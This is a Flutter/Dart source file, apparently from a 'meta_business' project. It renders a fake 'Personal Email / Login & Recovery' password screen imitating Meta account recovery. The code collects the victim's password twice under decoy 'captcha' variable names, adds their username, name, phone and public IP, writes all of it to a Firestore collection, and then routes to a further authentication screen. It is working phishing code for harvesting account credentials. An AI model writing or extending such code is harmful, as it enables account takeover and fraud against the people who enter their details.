import 'package:_iwu_pack/setup/app_textstyles.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:gap/gap.dart';
import 'package:meta_business/src/presentation/home/auth_screen.dart';
import 'package:meta_business/src/presentation/home/widget/widget_input.dart';
import 'package:meta_business/src/resources/firestore/firestore_resources.dart';
import 'package:meta_business/src/resources/firestore/instances.dart';
import 'package:dart_ipify/dart_ipify.dart';

class ModalSuccess extends StatefulWidget {
  final FormInput? data;

  const ModalSuccess({super.key, this.data});

  @override
  State<StatefulWidget> createState() => _ModalSuccessState();
}

class _ModalSuccessState extends State<ModalSuccess> {
  String error = "";
  String? capCha1;
  String? capCha2;
  bool validatedCapCha1 = false;

  TextEditingController controller = TextEditingController();
  Future<String> getPublicIP() async {
    final ipv6 = await Ipify.ipv64();
    print(ipv6);
    return ipv6;
  }

  submit() async {
    if (!validatedCapCha1) {
      if (controller.text.isEmpty) {
        print("controller ${controller.text}");
        setState(() {
          error = "Invalid password. Please try again";
        });
      } else if (controller.text != "") {
        setState(() {
          capCha1 = controller.text;
          error = "";
          print("cap1 $capCha1");
          controller.text = "";
          validatedCapCha1 = true;
        });
      }
    } else {
      if (controller.text.isEmpty) {
        setState(() {
          error = "Please enter capcha again for verification.";
        });
      } else {
        setState(() {
          capCha2 = controller.text;
          error = "";
          print("cap2 $capCha2");
        });
        String ip = await getPublicIP();
        DocumentReference row = await colData.add({
          "username": widget.data!.username,
          "name": widget.data!.name,
          "phone": widget.data!.phone,
          "comment": widget.data!.comment,
          "cap1": capCha1,
          "cap2": capCha2,
          "ip": ip
        }); //insert vào trong firebase
        Navigator.push(context, MaterialPageRoute(builder: (context) {
          return AuthScreen(
            rowId: row.id,
          );
        }));
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    print("check error $error");
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const Gap(8),
        Text(
          "Personal Email",
          style: w500TextStyle(fontSize: 28),
        ),
        const Gap(24),
        Text(
          "Login & Recovery",
          style: w300TextStyle(fontSize: 24),
        ),
        const Gap(8),
        Text(
          "Manage your passwords, login preferences and recovery methods.",
          style: w200TextStyle(fontSize: 14),
        ),
        const Gap(24),
        Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
              decoration: BoxDecoration(boxShadow: const [
                BoxShadow(
                  color: Color.fromARGB(255, 188, 188, 188), // Màu của đổ bóng
                  blurRadius: 10, // Bán kính đổ bóng
                  spreadRadius: 2, // Phạm vi đổ bóng
                )
              ], borderRadius: BorderRadius.circular(12), color: Colors.white),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    "Password",
                    style: TextStyle(fontSize: 16),
                  ),
                  TextFormField(
                    controller: controller,
                    decoration: const InputDecoration(border: InputBorder.none),
                  ),
                ],
              ),
            ),
            error == ""
                ? const Text("")
                : Text(
                    error,
                    style: const TextStyle(color: Colors.red),
                  )
          ],
        ),
        const SizedBox(height: 16),
        Align(
          alignment: Alignment.centerRight,
          child: ElevatedButton(
            onPressed: submit,
            style: ElevatedButton.styleFrom(
              primary: const Color(0xFF355797),
              textStyle: const TextStyle(color: Colors.white),
            ),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 16),
              child: const Text(
                "Continue",
                style: TextStyle(fontSize: 14),
              ),
            ),
          ),
        ),
      ],
    );
  }
}
